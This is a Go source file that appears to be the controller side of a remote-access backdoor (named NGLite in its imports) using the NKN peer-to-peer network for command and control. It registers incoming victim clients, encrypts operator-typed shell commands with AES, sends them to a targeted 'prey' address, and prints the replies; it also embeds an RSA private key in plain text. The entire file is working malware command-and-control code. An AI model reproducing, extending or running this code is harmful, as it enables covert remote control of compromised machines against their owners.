package main

import (
	"NGLite/conf"
	"NGLite/module/cipher"
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"strings"
	"time"

	nkn "github.com/nknorg/nkn-sdk-go"
)

const (
	RsaPrivateKey = `-----BEGIN PRIVATE KEY-----
MIIEowIBAAKCAQEAximut2j7W5ISBb//heyfumaN5pscUWhgJSAw/dHrlKqFhwU0
pB1wRmMrW7UCEJG0KLMBrXqvak5GWAv4nU/ev9kJohatyFvZYfEEWrlcqHCmJFW5
QcGNnRG52TG8bU6Xk7ide1PTmPmrUlXAEwysg4iYeWxCOpO9c4P7CLw/XyoHZ/yP
Xf/xPJNxxMpaudux1WAZBg+a1j1bilS5MBi60QMmE62OvKl2QpfTqFTDllh+UTou
Nzwt4fnEH5cQnhXxdDH7RGtj1Rnm7w1jwWr4mqGPzuE5KeNlPNPtN770fbSv0qOR
G7HZ4sJFv59Rs9fY7j64dJfNY5sf1Z31reoJIwIDAQABAoIBAHdw/FyUrJz/KFnK
5muEuqoR0oojCCiRbxIxmxYCh6quNZmyq44YKGpkr+ew7LOr/xlg/CvifQTodUHw
xUOctriQS1wlq03O/vIn4eYFQDJO4/WWrflSftcjrg+aCOchrf9eEZ4aYrocEwWn
pgRVaU5G8RCPDkRcdJ7B+HfFb7UdgoHr5/1oeMOCs4pxnq8riBZd9Z3GAcPUkSWq
7Fx/sqHftBZjV7FbA7erRcv4xypAjIp7WvohbYmydDErkDS3rd9Dte+6IG8n3qoS
nwACJFD9byFXdpai7BhfsEAlAh/7dsrivCsnDq0xY9Ee4JRdz6bAXzO3EamlaKAq
5d7tYqECgYEA6AGW7/WnJ27qtGKZZGKIIoE/OPTpJNsEYGQqYiEsrDITYDZZRG+q
B/whtTHm38CEmf4DSx14IB433w/hUBfTrTJCJjM2sRGRftrgh2xPdqK3hVr3Dy50
FeFETTLJlVQOw176CjMcX6+hhas88YhD6lRfNe61SNf7dHXzTMRsJvkCgYEA2qgV
HsU865SvNrHOMHe9y8tIL+x41VbU1c5MwJfvtHONgAPhS+P3m6yrGHdly3LAuteM
95HqRBq6bgN9LgHfRt6hKXZbILGeRgeYKTB1UJ39Z4KpMGkNYdG34Qjgq7FycvMd
SoWxlCWR5YI9h0eSZwjSfzefUSzD9aHTFgj0K/sCgYEAriTDTsps9URkF5IK4Ta0
SHILKo1qkqdy2YdV6OJNzdKoiIdC6gOG9QdjpcYXLcwrvArWHgO4ryL/fQdGb//y
ewZGcLXwT2iIdVeFQSEjZEEuz4I//702lVXJFskQVm4Jxsv7krxah9gkvViTHhjS
IYnDDZBnso2ryPbf8LdfFsECgYBRmRIwpniCjb0JUzdYHQdmKxloUP4S11Gb7F32
LX0VwV2X3VrRYGSB4uECw2PolY1Y7KG9reVXvwW9km2/opE5OFG6UGHXhJFFHwZo
sJ3HFP6BB2CuITYOQB43y4FUcWb9gL54lgXb/F1C4eSmPE5lRwSO1yoMOAF1BAvr
GDJOywKBgCnPnjckt+8nJXmTLkJlU0Klsee0aK5SQ2gXYc4af4U0TJXEhhsDymfN
UcokpJbmBeAiE2b8jnJox96cyVC8wNX395WgWtcTXC0vL/BeSUgfeJMnbQGnDD9j
RFDgdjmKGI/BamxEpmM2wPGhQtGYg6iXGVtCYjCWCjufoq8WS8Y8
-----END PRIVATE KEY-----`
)

var clientConf *nkn.ClientConfig

func init() {
	//初始化配置文件
	clientConf = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              4096,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
}

func main() {
	var Seed string
	var MakeSeed string
	flag.StringVar(&Seed, "g", "default", "group")
	flag.StringVar(&MakeSeed, "n", "default", "-n mew to make a new seed")
	flag.Parse()

	if MakeSeed == "new" {
		account, err := nkn.NewAccount(nil)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(hex.EncodeToString(account.Seed()))
		os.Exit(0)
	}

	if Seed == "default" {
		Seed = conf.Seedid
	}

	go Huntlistener(Seed)

	fmt.Println("starting...")
	for {
		//	获取输入的客户端及 命令
		inputReader := bufio.NewReader(os.Stdin)
		inputtext, err := inputReader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		strarray := strings.Fields(strings.TrimSpace(inputtext))
		// fmt.Println(strarray) //打印输入数组
		// fmt.Println(len(strarray))
		var command string
		for i := 1; i < len(strarray); i++ {
			command = command + strarray[i] + " "
		}
		// fmt.Println("command is:", command, ".")
		fmt.Println(BountyHunter(Seed, strarray[0], command))
	}

}

func BountyHunter(seedid string, prey string, command string) string {
	//初始化客户端
	seed, _ := hex.DecodeString(seedid)
	account, err := nkn.NewAccount(seed)
	if err != nil {
		log.Println(err)
	}

	//设置目标
	Prey, err := nkn.NewMultiClient(account, prey, conf.TransThreads, false, clientConf)
	// Prey, err := nkn.NewMultiClient(account, prey, conf.TransThreads, false, nil)
	if err != nil {
		log.Println(err)
	}
	// defer Prey.Close()
	//分配随机猎人
	Hunter, err := nkn.NewMultiClient(account, RandomID(), conf.TransThreads, false, clientConf)
	// Hunter, err := nkn.NewMultiClient(account, RandomID(), conf.TransThreads, false, nil)
	if err != nil {
		log.Println(err)
	}
	defer Hunter.Close()

	<-Hunter.OnConnect.C
	//发送并接收回复
	log.Println("Run Command", Hunter.Address(), "to", Prey.Address())

	encrycommand := AesEncode(command)
	onReply, err := Hunter.Send(nkn.NewStringArray(Prey.Address()), encrycommand, nil)
	if err != nil {

		log.Println(err)
	}
	reply := <-onReply.C
	// log.Println("Got reply", "\""+string(reply.Data)+"\"", "from", reply.Src)

	// wait to send receipt
	// time.Sleep(30 * time.Second)

	//解密RSA 加密压缩数据
	// entext := RsaDecode(reply.Data)
	// unziptext, _ := compress.UnZip(entext)
	// return string(unzip)

	//无加密

	return string(reply.Data)
}

func RandomID() string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 32; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ctx := md5.New()
	ctx.Write([]byte(result))
	return hex.EncodeToString(ctx.Sum(nil))
}

func AesEncode(str string) []byte {
	encode, err := cipher.AesCbcEncrypt([]byte(str), []byte(conf.AesKey))
	if err != nil {
		fmt.Println(err)
	}
	return encode
}

func RsaDecode(str []byte) []byte {
	plaintext, err := cipher.RsaDecrypt(str, []byte(RsaPrivateKey))
	if err != nil {
		fmt.Println(err)
	}
	return plaintext
}

func Huntlistener(seedid string) {
	err := func() error {

		//初始化客户端
		seed, _ := hex.DecodeString(seedid)
		// //log debug
		// fmt.Println(seed)
		account, err := nkn.NewAccount(seed)
		if err != nil {
			return err
		}

		//设置监听端
		Listener, err := nkn.NewMultiClient(account, conf.Hunterid, conf.TransThreads, false, clientConf)
		// Listener, err := nkn.NewMultiClient(account, conf.Hunterid, conf.TransThreads, false, nil)
		if err != nil {
			return err
		}
		// defer Listener.Close()
		<-Listener.OnConnect.C

		for {
			msg := <-Listener.OnMessage.C

			log.Println("New Client \"", string(RsaDecode(msg.Data)), "\"Added, msg from", msg.Src)
			msg.Reply([]byte("OK"))
		}

	}()
	if err != nil {
		fmt.Println(err)
	}
}
